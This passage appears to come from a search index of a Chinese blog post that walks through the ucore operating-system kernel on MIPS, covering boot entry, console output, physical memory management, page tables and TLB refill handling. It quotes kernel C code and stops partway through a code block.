</ul> </li> </ul> </li> <li>ide_init &amp; fs_init</li> </ul> </li> </ul>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#1-makefile","title":"1. Makefile","text":"<ol> <li><code>boot/loader.bin</code>\u57fa\u672c\u5c31\u662f\u4e00\u4e2a\u8bfb\u53d6elf\u7684\u51fd\u6570\uff0c\u6211\u4eec\u4e0a\u677f\u4f7f\u7528pmon\u52a0\u8f7ducore\uff0c\u56e0\u6b64\u7528\u4e0d\u5230\u3002</li> <li><code>obj/ucore-kernel-initrd</code>\u662f\u4e00\u4e2aelf\u6587\u4ef6\uff0c\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u7684data\u6bb5\u5305\u542b<code>user/_archive</code>\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff08\u5305\u542b\u4e00\u4e2atest.txt\uff09\u548c<code>$(USER_APP_BINS)</code>\uff08\u5982sh, ls\u7b49\u7528\u6237\u7a0b\u5e8f\uff09\u7684\u5185\u5bb9\u3002\u5c06\u5185\u6838\u548c\u6587\u4ef6\u7cfb\u7edf\u6253\u5305\u5230\u4e86\u4e00\u8d77\u3002</li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#2-kernel_entry","title":"2. kernel_entry","text":"<p>kern/init/entry.S</p> <ol> <li>\u8bbe\u7f6e\u4e86$gp</li> </ol> <p>\u5b9a\u4e49\u5728\u94fe\u63a5\u811a\u672c\u91cc\uff0c\u53ef\u4ee5\u901a\u8fc7<code>readelf obj/ucore-kernel-initrd -a|grep _gp</code>\u6765\u67e5\u770b\u5176\u503c\u3002\u53c2\u8003\u503c\uff08\u4fee\u6539\u4e86\u4ee3\u7801\u7f16\u8bd1\u51fa\u7684\u503c\u53ef\u80fd\u4e0d\u4e00\u6837\uff09<code>0x800c7f40</code></p> <ol> <li>\u8bbe\u7f6e\u4e86$sp\uff0c\u542f\u52a8\u65f6\u7528\u7684\u6808\uff0c\u6808\u5927\u5c0f\u4e3a<code>KSTACKSIZE</code>\uff0c8KB</li> </ol> <p>\u53c2\u8003\u503c\uff1a<code>bootstacktop(0x80068730)</code>\uff0c<code>bootstack(0x80066730)</code></p> <ol> <li>\u8bbe\u7f6e\u4e86Ebase\u4e3a<code>__exception_vector</code>\u3002\u53c2\u8003\u503c\uff1a<code>0x8002b000</code>\u3002__exception_vector\u5305\u542b\u4e86\u5404\u5f02\u5e38\u5411\u91cf\u5730\u5740\u7684\u5165\u53e3\u3002</li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#3-kern_init","title":"3. kern_init","text":"<p>kern/int/init.c</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u6742\u9879","title":"\u6742\u9879","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#tlb_invalidate_all","title":"tlb_invalidate_all","text":"<p>\u5b9a\u4e49\u4e8ekern/include/thumips_tlb.h\u548ckern/mm/thumips_tlb.c</p> <p>tlb_invalidata_all\u5faa\u73af\u8c03\u7528write_one_tlb\u6e05\u7a7atlb\u8868\u9879 \u9ed8\u8ba4tlb\u6709128\u9879\uff0c\u867d\u7136\u4e0d\u4f1a\u5bfc\u81f4\u9519\u8bef\uff0c\u4f46\u662f\u53ef\u4ee5\u4f18\u5316</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pic_init","title":"pic_init","text":"<p>\u5b9a\u4e49\u4e8ekern/driver/picirq.c pic_init -&gt; write_c0_status \u5c06Statu\u4e2d\u7684IM\u57df\u5168\u7f6e0\uff0c\u5173\u95ed\u6240\u6709\u4e2d\u65ad\u3002 \u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7pic_enable(int irq)\u6216pic_disable(int irq)\u5f00\u5173\u4e2d\u65ad</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#cons_init--clock_init","title":"cons_init &amp; clock_init","text":"<p>\u4e00\u4e2a\u521d\u59cb\u5316\u4e32\u53e3\uff0c\u4e00\u4e2a\u521d\u59cb\u5316\u65f6\u949f\u4e2d\u65ad\u3002</p> <p>\u76f8\u5173\u5b8f\u5b9a\u4e49\u4e8e/kern/include/thumips.h</p> <pre><code>#define COM1_IRQ        3\n#define TIMER0_IRQ       7\n</code></pre> <p>clock\u9700\u8981\u7528\u5230<code>cp0_count</code>\u548c<code>cp0_compare</code> \u8bbe\u7f6eclock\u4e2d\u65ad\u540e\uff0c\u6bcf<code>clock.c::TIMER0_INTERVAL</code>=1000000\u540e\u4f1a\u4ea7\u751f\u4e00\u4e2a\u65f6\u949f\u4e2d\u65ad</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_initrd","title":"check_initrd","text":"<p>\u68c0\u67e5\u5185\u6838\u662f\u5426\u6709initrd\uff0c\u901a\u8fc7\u5224\u65ad\u662f\u5426_initrd_begin == _initrd_end)</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#kprintf","title":"kprintf","text":"<p>\u5185\u6838\u7b2c\u4e00\u6b21\u8f93\u51fa\u4fe1\u606f</p> <pre><code>const char *message = \"(THU.CST) os is loading ...\\n\\n\";\nkprintf(message);\n</code></pre> <p>kprintf\u51fd\u6570\u6700\u540e\u8c03\u7528\u4e32\u53e3\u7684cons_putc\u8f93\u51fa\u5b57\u7b26\u3002\u4e32\u53e3\u8f93\u51fa\u5b57\u7b26\u91c7\u7528\u5fd9\u7b49\u5f85\u65b9\u5f0f\u3002</p> <pre><code>kern/lib/stdio.c::kprintf -&gt; kern/lib/stdio.c::vkprintf -&gt; kern/lib/printfmt.c::vprintfmt(cputch, ...)\n\nkern/lib/stdio.c::cputch -&gt; kern/driver/console.c::cons_putc\n</code></pre> <pre><code>#!kern/driver/console.c\n\nstatic void\nserial_putc_sub(int c) {\n    while (!(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY)) {\n    }\n    outb(COM1 + COM_TX, c);\n}\n</code></pre> <p>\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u7528\u6237\u7a0b\u5e8fcprintf</p> <pre><code>user/lib/stdio.c::cprintf -&gt; user/lib/stdio.c::vcprintf -&gt; user/lib/stdio.c::vprintfmt(cputch, ...)\nuser/lib/stdio.c::cputch -&gt; user/lib/syscall.c::sys_putc -&gt; syscall(SYS_putc, )\n\u7cfb\u7edf\u8c03\u7528\uff0c\u8fdb\u5165\u5185\u6838\n\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8c03\u7528kern/syscall/syscall.c::sys_putc -&gt; kern/lib/stdio.c::kputchar -&gt; cons_putc\n</code></pre> <p>\u7528\u6237\u7a0b\u5e8f\u8f93\u51fa\u6bcf\u4e00\u4e2a\u5b57\u7b26\u90fd\u4f1a\u89e6\u53d1\u4e00\u6b21\u7cfb\u7edf\u8c03\u7528</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pmm_init","title":"pmm_init","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page\u7ed3\u6784\u4f53","title":"page\u7ed3\u6784\u4f53","text":"<pre><code>struct Page {\n    atomic_t ref;                   // page frame's reference counter\n    uint32_t flags;                 // array of flags that describe the status of the page frame\n    unsigned int property;          // used in buddy system, stores the order (the X in 2^X) of the continuous memory block\n    int zone_num;                   // used in buddy system, the No. of zone which the page belongs to\n    list_entry_t page_link;         // free list link\n//    swap_entry_t index;             // stores a swapped-out page identifier\n    list_entry_t swap_link;         // swap hash link\n};\n</code></pre> <p>ucore\u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u6210\u4e00\u4e2a\u4e00\u4e2a\u7684\u9875\uff0c\u5e76\u4f7f\u7528Page\u7ed3\u6784\u4f53\u6570\u7ec4\u6765\u7ba1\u7406\u3002\u4e00\u4e2aPage\u9879\u5bf9\u5e94\u4e00\u4e2a\u7269\u7406\u9875\u3002</p> <p>\u53c2\u8003pmm.c::page_init\u4ee3\u7801</p> <pre><code>kprintf(\"memory map:\\n\");\nkprintf(\"    [\");\nprinthex(KERNBASE);\nkprintf(\", \");\nprinthex(KERNTOP);\nkprintf(\"]\\n\\n\");\n\nmaxpa = KERNTOP;\nnpage = KMEMSIZE &gt;&gt; PGSHIFT;\n\n// end address of kernel\nextern char end[];\n// put page structure table at the end of kernel\npages = (struct Page *)ROUNDUP_2N((void *)end, PGSHIFT); \n</code></pre> <p><code>KMEMSIZE</code>\u4ee3\u8868\u5185\u6838\u7ba1\u7406\u7684\u7269\u7406\u5185\u5b58\u7684\u5927\u5c0f\uff0cnpage\u8ba1\u7b97\u51fa\u6765\u4e3a\u7269\u7406\u9875\u7684\u4e2a\u6570\u3002</p> <p>end\u5728\u94fe\u63a5\u811a\u672c\u4e2d\u5b9a\u4e49\uff0c\u4e3aucore-kernel-initrd\u7684\u7ed3\u5c3e\u3002\u5373ucore\u5728\u5185\u6838\u7684\u7ed3\u5c3e\u5206\u914d\u4e86\uff08\u76f4\u63a5\u5199\uff09Page\u6570\u7ec4\u7684\u7a7a\u95f4\uff0cpages\u4e3a\u6570\u7ec4\u7684\u8d77\u59cb\u5730\u5740\u3002</p> <p>\u6b64\u65f6page\u9879\u53ef\u4ee5\u548c\u7269\u7406\u9875\u4e00\u4e00\u5bf9\u5e94\u8d77\u6765\u4e86</p> <pre><code>static inline ppn_t\npage2ppn(struct Page *page) {\n    return page - pages;\n}\n\nstatic inline uintptr_t\npage2pa(struct Page *page) {\n    return KERNBASE + (page2ppn(page) &lt;&lt; PGSHIFT);\n}\n\nstatic inline struct Page *\npa2page(uintptr_t pa) {\n    if (PPN(pa) &gt;= npage) {\n        panic(\"pa2page called with invalid pa\");\n    }\n    return &amp;pages[PPN(pa)];\n}\n\nstatic inline void *\npage2kva(struct Page *page) {\n    return KADDR(page2pa(page));\n}\n</code></pre> <p>\u8fd9\u91cc\u5f3a\u8c03\u4e00\u4e0b<code>page2kva</code>\u4e2d<code>KADDR</code>\u7684\u4f5c\u7528\uff0c\u4e8b\u5b9e\u4e0a\u5982\u679c\u770b\u5176\u5b9a\u4e49\u7684\u8bdd\uff0cKADDR(pa)\u7684\u503c\u548cpa\u662f\u4e00\u6837\u7684\uff0c\u5982\u4e0b</p> <pre><code>/* *\n * PADDR - takes a kernel virtual address (an address that points above KERNBASE),\n * where the machine's maximum 256MB of physical memory is mapped and returns the\n * corresponding physical address.  It panics if you pass it a non-kernel virtual address.\n * */\n#define PADDR(kva) ({                                                   \\\n            uintptr_t __m_kva = (uintptr_t)(kva);                       \\\n            if (__m_kva &lt; KERNBASE) {                                   \\\n                panic(\"PADDR called with invalid kva %08lx\", __m_kva);  \\\n            }                                                           \\\n            __m_kva ;                                         \\\n        })\n\n/* *\n * KADDR - takes a physical address and returns the corresponding kernel virtual\n * address. It panics if you pass an invalid physical address.\n * */\n#define KADDR(pa) ({                                                    \\\n            uintptr_t __m_pa = (pa);                                    \\\n            size_t __m_ppn = PPN(__m_pa);                               \\\n            if (__m_ppn &gt;= npage) {                                     \\\n                panic(\"KADDR called with invalid pa %08lx\", __m_pa);    \\\n            }                                                           \\\n            (void *) (__m_pa);                               \\\n        })\n</code></pre> <p>\u800c\u4e4b\u6240\u4ee5\u9700\u8981\u8fdb\u884c\u4e00\u6b21\u8f6c\u6362\uff0c\u4e3b\u8981\u662f\u4fdd\u6301\u903b\u8f91\u4e0a\u7684\u4e00\u81f4\u6027\u3002\u56e0\u4e3aCPU\u76f4\u63a5\u53d1\u51fa\u7684\u5730\u5740\u90fd\u662f\u865a\u62df\u5730\u5740\uff0c\u4f1a\u7ecf\u8fc7MMU\u8fdb\u884c\u865a\u62df\u5730\u5740\u8f6c\u6362\uff08\u4e00\u822c\u57fa\u4e8eTLB\uff0c\u800cTLB\u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u7684\u9875\u8868\uff09\u3002\u6574\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u662f\u786c\u4ef6\u81ea\u52a8\u5b8c\u6210\u7684\uff0c\u56e0\u6b64\u8f6f\u4ef6\u57fa\u672c\u4e0d\u7528\u548c\u7269\u7406\u5730\u5740\u6253\u4ea4\u9053\uff08\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6d89\u53ca\u5230\u548c\u786c\u4ef6\u8f6f\u786c\u4ef6\u534f\u540c\u7684\u90e8\u5206\u4f1a\u6d89\u53ca\u5230\u7269\u7406\u5730\u5740\uff0c\u5982\u9875\u8868\u4e2d\u5b58\u50a8\u7684\u5730\u5740\u662f\u7269\u7406\u5730\u5740\uff0c\u5f53MIPS\u4e2dtlb refill\u5f02\u5e38\u65f6\uff0c\u4fbf\u4f1a\u8bfb\u53d6\u9875\u8868\u9879\u52a0\u8f7d\u5230TLB\u8868\u9879\u4e2d\uff09</p> <p>\u56e0\u800c\u6211\u4eec\u5728\u4ee3\u7801\u4e2d\u8bbf\u95ee\u6570\u636e\u65f6\u90fd\u8981\u4f7f\u7528\u865a\u62df\u5730\u5740\u3002</p> <p>\u56e0\u4e3a\u8fd9\u91cc\u7684\u6574\u4e2a\u5185\u6838\u865a\u62df\u7a7a\u95f4\uff08<code>[KERNBASE, KERNBASE+KMEMSIZE]=[0x8000_0000, 0x8200_0000)</code>\uff09\u90fd\u4f4d\u4e8eMIPS\u4e2d\u7684kseg0\u6bb5\uff0c\u800c\u8be5\u6bb5\u91c7\u7528\u56fa\u5b9a\u5730\u5740\u6620\u5c04\u7684\u65b9\u5f0f\uff0c\u800c\u4e0d\u4f7f\u7528TLB\uff0c\u56e0\u6b64\u5185\u6838\u8bbf\u95ee\u6574\u4e2a\u5185\u6838\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e1d\u6beb\u4e0d\u7528\u62c5\u5fc3\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef","title":"\u8fd9\u91cc\u5e94\u8be5\u6709\u4e00\u4e2a\u9519\u8bef","text":"<p>\u6309\u7167\u5b9a\u4e49\u6765\u8bf4\uff0cpage2pa\u5c31\u5e94\u8be5\u662f(page2ppn(page) &lt;&lt; PGSHIFT)\uff0c\u52a0\u4e86KERNBASE\u540e\u53cd\u800c\u662f\u865a\u62df\u5730\u5740\u4e86\u3002</p> <p>\u4e0d\u8fc7\u56e0\u4e3aKADDR\u4e5f\u9519\u4e86\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u5206\u914d\u4e86\u4e00\u4e2a\u7a7a\u95f2\u7269\u7406\u9875page\u540e\uff0c\u8981\u83b7\u5f97\u5176\u865a\u62df\u5730\u5740</p> <p><code>KADDR(page2pa(page))</code>\u53cd\u800c\u6ca1\u9519\u4e86</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u7a7a\u95f2\u9875","title":"\u7a7a\u95f2\u9875","text":"<p>\u7a7a\u95f2\u5730\u5740\u5f00\u59cb\u4e8ePage\u6570\u7ec4\u4e4b\u540e\u3002init_memmap\u4f1a\u8c03\u7528pmm_manager\u7684init_memmap\u51fd\u6570\uff0c\u7528\u4e8e\u8bb0\u5f55\u54ea\u4e9b\u9875\u662f\u7a7a\u95f2\u7684\u3002</p> <pre><code>uintptr_t freemem = PADDR((uintptr_t)pages + sizeof(struct Page) * npage);\nPRINT_HEX(\"freemem start at: \", freemem);\n\nuint32_t mbegin = ROUNDUP_2N(freemem, PGSHIFT);\nuint32_t mend = ROUNDDOWN_2N(KERNTOP, PGSHIFT);\nassert( mbegin &lt; mend );\ninit_memmap(pa2page(mbegin), (mend - mbegin) &gt;&gt; PGSHIFT );\nPRINT_HEX(\"free pages: \", (mend-mbegin)&gt;&gt;PGSHIFT);\nPRINT_HEX(\"## \", sizeof(struct Page));\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pmm_manager","title":"pmm_manager","text":"<p>\u7269\u7406\u5185\u5b58\u7ba1\u7406\u5176\u5b9e\u5c31\u662f\u8981\u5b9e\u73b0\u7269\u7406\u7a7a\u95f2\u9875\u7684\u5206\u914d\u548c\u56de\u6536\uff0cucore\u5b9a\u4e49\u4e86pmm_manager\u7684\u7ed3\u6784\u4f53\uff0c\u53ef\u4ee5\u8ba4\u4e3aC\u4e2d\u5b9e\u73b0\u7684\u7c7b\u3002</p> <p>\u5173\u952e\u7684\u4e24\u4e2a\u51fd\u6570\uff1a</p> <pre><code>struct Page *(*alloc_pages)(size_t n);\nvoid (*free_pages)(struct Page *base, size_t n);\n</code></pre> <p>alloc_pages\u4ece\u7a7a\u95f2\u9875\u4e2d\u5206\u914d\u4e86\u4e00\u6bb5\u8fde\u7eed\u7684\u7a7a\u95f2\u9875</p> <p>\u800cfree_pages\u5219\u5c06\u6307\u5b9a\u7684\u4e00\u6bb5\u8fde\u7eed\u7684\u9875\u91cd\u65b0\u56de\u6536\u4e3a\u7a7a\u95f2\u9875</p> <p>ucore\u4ee3\u7801\u5b9e\u73b0\u4e86\u4f19\u4f34\u5206\u914d\u7cfb\u7edf(buddy system)\uff0c\u53ef\u4ee5\u53c2\u8003\u5176\u5177\u4f53\u5b9e\u73b0</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#\u9875\u8868\u76f8\u5173\u51fd\u6570","title":"\u9875\u8868\u76f8\u5173\u51fd\u6570","text":"<p>ucore\u5b9e\u73b0\u4e86\u4e8c\u7ea7\u9875\u8868</p> <p>\u5173\u952e\u51fd\u6570</p> <pre><code>pte_t *get_pte(pde_t *pgdir, uintptr_t la, bool create);\nstruct Page *get_page(pde_t *pgdir, uintptr_t la, pte_t **ptep_store);  //\u6839\u636epte\u7684\u503c\u83b7\u5f97\u5bf9\u5e94\u7684page\nvoid page_remove(pde_t *pgdir, uintptr_t la);\nint page_insert(pde_t *pgdir, struct Page *page, uintptr_t la, uint32_t perm);\nstruct Page * pgdir_alloc_page(pde_t *pgdir, uintptr_t la, uint32_t perm);\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#get_pte","title":"get_pte","text":"<pre><code>pte_t *get_pte(pde_t * pgdir, uintptr_t la, bool create)\n</code></pre> <p>\u51fd\u6570\u4f5c\u7528\uff1a\u7ed9\u5b9a\u9875\u76ee\u5f55\u8868\u7684\u865a\u62df\u5730\u5740\uff0c\u67e5\u627e\u865a\u62df\u5730\u5740la\u5bf9\u5e94\u7684\u9875\u8868\u9879pte\u3002\uff08\u53ea\u8981la\u5728\u4e00\u4e2a\u9875\u5185\uff0c\u8fd4\u56de\u7684pte\u662f\u76f8\u540c\u7684\uff09     \u6ce8\uff1a\u83b7\u5f97\u7684\u662fpte\u9879\u7684\u865a\u62df\u5730\u5740 \u8fc7\u7a0b\uff1a</p> <ol> <li>\u5148\u8ba1\u7b97\u9875\u76ee\u5f55\u8868\u4e2d\u5bf9\u5e94pde\u8868\u9879\u7684\u865a\u62df\u5730\u5740</li> </ol> <pre><code>pdep = pgdir + PDX(la)\n</code></pre> <ol> <li>\u5982\u679cpde\u9879\u6709\u6548\uff0c\u5373<code>((*pdep)&amp;PTE_P) == 0</code>\u3002\u76f4\u63a5\u8bbf\u95eepde\u83b7\u5f97la\u5bf9\u5e94\u4e8c\u7ea7\u9875\u8868\u7684\u7269\u7406\u5730\u5740\u3002</li> </ol> <pre><code>PDE_ADDR(*pdep)\n</code></pre> <ol> <li>\u8ba1\u7b97\u4e8c\u7ea7\u9875\u8868\u4e2d\u5bf9\u5e94\u9875\u8868\u9879pte\u7684\u7269\u7406\u5730\u5740</li> </ol> <pre><code>(pte_t*)(    PDE_ADDR(*pdep)   ) + PTX(la)\n</code></pre> <ol> <li>\u8f6c\u6362\u6210\u865a\u62df\u5730\u5740</li> </ol> <pre><code>(pte_t*)KADDR(   (uintptr_t)(  (pte_t*)(PDE_ADDR(*pdep))+PTX(la)  )  )\n</code></pre> <ol> <li>\u5982\u679c02\u4e2d\u65e0\u6548\uff0c\u5219\u9700\u8981\u6839\u636ecreate\u51b3\u5b9a\u662f\u5426\u521b\u5efa\u4e8c\u7ea7\u9875\u8868\u3002\uff08\u4e0b\u9762\u4ee3\u7801\u53ea\u8003\u8651\u4e86\u521b\u5efa\u60c5\u5f62\uff0c\u5e76\u4e3a\u4e86\u7a81\u51fa\u91cd\u70b9\uff0c\u5220\u51cf\u4e86\u8bb8\u591a\u6709\u7528\u7684\u4ee3\u7801\uff09</li> </ol> <pre><code>struct Page* new_pte = alloc_page();\n\nuintptr_t pa = (uintptr_t)page2kva(new_pte);\n*pdep = PADDR(pa);\n</code></pre> <p>\u6700\u540e\u4e00\u884c\uff0c\u9875\u8868\u4e2d\u5b58\u50a8\u7684\u662f\u7269\u7406\u5730\u5740\u3002\u7136\u800c\u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u6211\u4eec\u77e5\u9053\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684PADDR(pa)\u5b9e\u9645\u4e0a\u662f\u865a\u62df\u5730\u5740\u3002\u7136\u800c\u6211\u4eec\u53d1\u73b0\u5728\u8fd9\u6837\u8bbe\u7f6e\u4e4b\u540e\uff0c\u4e0b\u6b21\u8c03\u7528get_pte\u65f6\uff0c\u83b7\u5f97\u7684pte\u7684\u5730\u5740\u786e\u5b9e\u662f\u865a\u62df\u5730\u5740\uff08KADDR\u4e0d\u4ea7\u751f\u4f5c\u7528\uff09\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page_insert","title":"page_insert","text":"<pre><code>int page_insert(pde_t *pgdir, struct Page *page, uintptr_t la, uint32_t perm)\n</code></pre> <p>\u4f5c\u7528\uff1a\u5c06\u865a\u62df\u5730\u5740la\u6620\u5c04\u5230page\u5bf9\u5e94\u7684\u7269\u7406\u9875\u4e0a</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li> <p>\u6839\u636e\u865a\u62df\u5730\u5740la\u67e5\u627e\u5230\u4e8c\u7ea7\u9875\u8868\u9879ptep</p> </li> <li> <p>\u5982\u679c\u539f\u672cptep\u5df2\u7ecf\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u7269\u7406\u9875\u4e0a\u4e86\uff0c\u5219\u5220\u9664\u8be5\u6620\u5c04\uff08\u6709\u53ef\u80fd\u5bfc\u81f4\u56de\u6536\u7269\u7406\u9875\uff09</p> </li> <li> <p>\u8bbe\u7f6eptep\u6620\u5c04\u5230\u65b0\u7269\u7406\u9875</p> </li> </ol> <pre><code>*ptep = page2pa(page) | PTE_P | perm;\n</code></pre> <p>\u7531\u4ee5\u4e0a\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u4e8c\u7ea7\u9875\u8868\u9879\u4e2d\u5b58\u50a8\u7684\u5730\u5740\u5176\u5b9e\u662f\u865a\u62df\u5730\u5740\u3002</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#page_remove","title":"page_remove","text":"<pre><code>void page_remove(pde_t *pgdir, uintptr_t la) {\n</code></pre> <p>\u4f5c\u7528\uff1a\u89e3\u9664pgdir\u4e2d\u865a\u62df\u5730\u5740la\u7684\u6620\u5c04</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li>\u83b7\u5f97pte</li> </ol> <pre><code>pte_t *ptep = get_pte(pgdir, la, 0);\n</code></pre> <ol> <li>\u5982\u679c<code>ptep != NULL</code>\u4e14<code>*ptep &amp; PTE_P</code>\uff0c</li> </ol> <pre><code>struct Page *page = pte2page(*ptep);\npage_ref_dec(page);\n// and free it when reach 0\nif(page_ref(page) == 0){\n    free_page(page);\n}\n</code></pre> <ol> <li>\u6e05\u9664\u6620\u5c04</li> </ol> <pre><code>*ptep = 0;\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#pgdir_alloc_page","title":"pgdir_alloc_page","text":"<pre><code>struct Page * pgdir_alloc_page(pde_t *pgdir, uintptr_t la, uint32_t perm)\n</code></pre> <p>\u4f5c\u7528\uff1a\u8be5\u51fd\u6570\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5c06la\u5bf9\u5e94\u7684\u865a\u62df\u9875\uff0c\u6620\u5c04\u5230\u8be5\u7269\u7406\u9875</p>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check","title":"check","text":"","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_pgdir","title":"check_pgdir","text":"<ol> <li>\u5c06\u865a\u62df\u5730\u57400x0\u6620\u5c04\u5230\u4e00\u4e2a\u7269\u7406\u9875(\u968f\u4fbf\u5206\u914d\u4e00\u4e2apage, p1)\u4e0a\u3002</li> <li>\u5c06\u865a\u62df\u5730\u57400x1000(PAGESIZE)\u6620\u5c04\u5230\u4e00\u4e2a\u7269\u7406\u9875(\u968f\u4fbf\u5206\u914d\u4e00\u4e2apage, p2)\u3002</li> <li>\u5c060x1000\u91cd\u65b0\u6620\u5c04\u5230p1.    ......    \u4e3b\u8981\u662f\u68c0\u67e5\u4e86page_insert, page_remove\u7b49\u51fd\u6570\u7684\u6b63\u786e\u6027\u3002</li> </ol>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#check_boot_pgdirtlb-refill\u5904\u7406","title":"check_boot_pgdir\uff08tlb refill\u5904\u7406)","text":"<ol> <li>\u5206\u914d\u4e00\u4e2a\u7269\u7406\u9875\uff0c\u5e76\u5199\u5165\u521d\u59cb\u503c</li> </ol> <pre><code>struct Page *p;\np = alloc_page();\n*(int*)(page2kva(p) + 0x100) = 0x1234;\n</code></pre> <ol> <li>\u5c06\u4e24\u4e2a\u865a\u62df\u9875\u6620\u5c04\u5230\u8be5\u7269\u7406\u9875\u4e0a</li> </ol> <pre><code>assert(page_insert(boot_pgdir, p, 0x100, PTE_W) == 0);\nassert(page_ref(p) == 1);\nassert(page_insert(boot_pgdir, p, 0x100 + PGSIZE, PTE_W) == 0);\nassert(page_ref(p) == 2);\n</code></pre> <ol> <li>\u76f4\u63a5\u4f7f\u7528\u865a\u62df\u5730\u5740\u8bbf\u95ee\u8be5\u7269\u7406\u9875\uff0c\u5f15\u53d1tlb refill\u5f02\u5e38</li> </ol> <pre><code>assert(*(int*)0x100 == 0x1234);\n</code></pre> <ol> <li>\u8fdb\u5165\u5bf9\u5e94\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f</li> </ol> <pre><code>static void handle_tlbmiss(struct trapframe* tf, int write)\n{\n  int in_kernel = trap_in_kernel(tf);\n  assert(current_pgdir != NULL);\n  uint32_t badaddr = tf-&gt;tf_vaddr;\n  int ret = 0;\n  pte_t *pte = get_pte(current_pgdir, tf-&gt;tf_vaddr, 0);\n  if(pte==NULL || ptep_invalid(pte)){   //PTE miss, pgfault\n      kprintf(\"## pagefault in kernel, badaddr: 0x%x\\n\", badaddr);\n    //tlb will not be refill in do_pgfault,\n    //so a vmm pgfault will trigger 2 exception\n    //permission check in tlb miss\n    ret = pgfault_handler(tf, badaddr, get_error_code(write, pte));\n  }else{ //tlb miss only, reload it\n    /* refill two slot */\n    /* check permission */\n    if(in_kernel){\n      kprintf(\"## tlb refill 